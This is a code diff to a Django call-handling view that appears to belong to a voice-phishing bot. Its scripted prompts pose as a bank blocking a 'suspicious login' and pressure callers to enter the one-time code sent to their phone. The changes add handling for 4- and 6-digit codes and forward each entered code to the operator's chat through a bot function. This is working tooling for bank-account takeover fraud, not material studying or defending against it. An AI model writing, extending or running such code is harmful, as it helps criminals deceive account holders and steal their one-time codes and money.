@@ -445,11 +445,31 @@ def gather(request,chat_id,bank):
             gather.say('We need to confirm your identity first before blocking this request. Enter the pin code sent to your phone number.')
             resp.append(gather)
         elif len(choice) > 3:
-            gather = Gather(action=f'/pay/otp/{chat_id}/{bank}/')
-            resp.say(f"You have entered {choice}. Press 1 to confirm, or press 2 to re-enter")
-            text = f'The OTP code inputed by the user at first stage is {choice}'
-            bot(chat_id,text)
-            resp.append(gather)
+            if len(choice) == 4:
+                digit_1 = choice[0]
+                digit_2 = choice[1]
+                digit_3 = choice[2]
+                digit_4 = choice[3]
+                gather = Gather(action=f'/pay/otp/{chat_id}/{bank}/')
+                resp.say(f"You have entered {digit_1},{digit_2},{digit_3},{digit_4}. Press 1 to confirm, or press 2 to re-enter")
+                text = f'The OTP code inputed by the user at first stage is {choice}'
+                async_to_sync(bot)(chat_id,text)
+                resp.append(gather)
+            elif len(choice) == 6:
+                digit_1 = choice[0]
+                digit_2 = choice[1]
+                digit_3 = choice[2]
+                digit_4 = choice[3]
+                digit_5 = choice[4]
+                digit_6 = choice[5]
+                gather = Gather(action=f'/pay/otp/{chat_id}/{bank}/')
+                resp.say(f"You have entered {digit_1},{digit_2},{digit_3},{digit_4},{digit_5},{digit_6}. Press 1 to confirm, or press 2 to re-enter")
+                text = f'The OTP code inputed by the user at first stage is {choice}'
+                async_to_sync(bot)(chat_id,text)
+                resp.append(gather)
+            else:
+                resp.say("Invalid pin code entered, Last chance to verify your identity or your account may be locked for a while")
+                resp.redirect(f'/pay/gather/{chat_id}/{bank}/')
             
         else:
             # If the caller didn't choose 1 or 2, apologize and ask them again
@@ -469,7 +489,7 @@ def choice(request, chat_id, bank):
 
         if pin == '1':
             text = f'The OTP code inputed by the user is {pin}✅'
-            bot(chat_id,text)
+            async_to_sync(bot)(chat_id,text)
             resp.say("Thank you for your cooperation. The suspicious login has been blocked.")
         
         elif pin == '2':
@@ -478,6 +498,6 @@ def choice(request, chat_id, bank):
             resp.say("Error No digits")
     else:
         text = "Error No digits"
-        bot(chat_id,text)
+        async_to_sync(bot)(chat_id,text)
 
     return HttpResponse(str(resp))
